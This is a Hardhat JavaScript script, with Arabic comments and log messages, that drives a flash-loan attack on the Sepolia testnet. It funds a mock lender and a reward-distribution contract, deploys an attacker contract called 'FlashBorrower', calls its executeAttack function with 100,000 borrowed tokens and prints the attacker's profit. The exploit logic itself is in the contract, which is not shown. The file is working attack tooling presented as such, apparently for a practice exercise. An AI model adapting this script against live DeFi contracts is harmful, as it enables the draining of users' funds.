const { ethers } = require("hardhat");

async function main() {
    console.log("🚀 جاري بدء سكربت الهجوم الشامل...");

    const TOKEN_ADDRESS = "0x192deab5e79ce56ccc79735b6b9c3d95696ab665";
    const TARGET_ADDRESS = "0x5fae1bd690c2ef0596d98e41a785594a4cf67ff4"; 
    const LENDER_ADDRESS = "0x2edf70cdca407a162b8e41a2d8d1fb62bf03c50d"; 

    const [attacker] = await ethers.getSigners();
    console.log(`👤 محفظة المهاجم: ${attacker.address}`);

    // 1. الاتصال بالعملة
    const tokenContract = await ethers.getContractAt("ERC20Mock", TOKEN_ADDRESS, attacker);

    // 2. فحص وتمويل منصة القروض (Lender) إذا كانت فارغة
    let lenderBalance = await tokenContract.balanceOf(LENDER_ADDRESS);
    console.log(`💰 رصيد منصة القروض: ${ethers.formatEther(lenderBalance)} توكن`);
    if (lenderBalance < ethers.parseEther("1000000")) {
        console.log("⚠️ منصة القروض فارغة! جاري تمويلها بمليون توكن...");
        await (await tokenContract.transfer(LENDER_ADDRESS, ethers.parseEther("1000000"))).wait();
        console.log("✅ تم تمويل منصة القروض.");
    }

    // 3. فحص وتمويل عقد التوزيعات (Target) إذا كان فارغاً
    let targetBalance = await tokenContract.balanceOf(TARGET_ADDRESS);
    console.log(`🏦 رصيد عقد التوزيعات: ${ethers.formatEther(targetBalance)} توكن`);
    if (targetBalance < ethers.parseEther("2000000")) {
        console.log("⚠️ عقد التوزيعات فارغ! جاري تمويله بمليوني توكن...");
        await (await tokenContract.transfer(TARGET_ADDRESS, ethers.parseEther("2000000"))).wait();
        console.log("✅ تم تمويل عقد التوزيعات.");
    }

    // 4. نشر عقد المهاجم
    console.log("⏳ جاري نشر عقد المهاجم FlashBorrower...");
    const FlashBorrower = await ethers.getContractFactory("FlashBorrower");
    const borrower = await FlashBorrower.deploy(
        ethers.getAddress(LENDER_ADDRESS), 
        ethers.getAddress(TARGET_ADDRESS), 
        ethers.getAddress(TOKEN_ADDRESS)
    );
    await borrower.waitForDeployment();
    const borrowerAddress = await borrower.getAddress();
    console.log(`✅ تم نشر عقد المهاجم على: ${borrowerAddress}`);

    // 5. تنفيذ الهجوم
    const borrowAmount = ethers.parseEther("100000"); 
    console.log(`⚔️ جاري تنفيذ الهجوم (اقتراض 100,000 توكن)...`);
    
    try {
        // إجبار المعاملة على استخدام غاز كافٍ
        const tx = await borrower.executeAttack(borrowAmount, { gasLimit: 3000000 });
        console.log("⏳ في انتظار تأكيد المعاملة...");
        await tx.wait();
        
        console.log("🎉🎉 تمت المعاملة بنجاح! 🎉🎉");
        console.log(`🔗 المعاملة: https://sepolia.etherscan.io/tx/${tx.hash}`);
        
        const profit = await tokenContract.balanceOf(borrowerAddress);
        console.log(`🔥 ربح المهاجم: ${ethers.formatEther(profit)} توكن`);

    } catch (error) {
        console.error("❌ فشل الهجوم!");
        console.log("💡 السبب:", error.message);
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});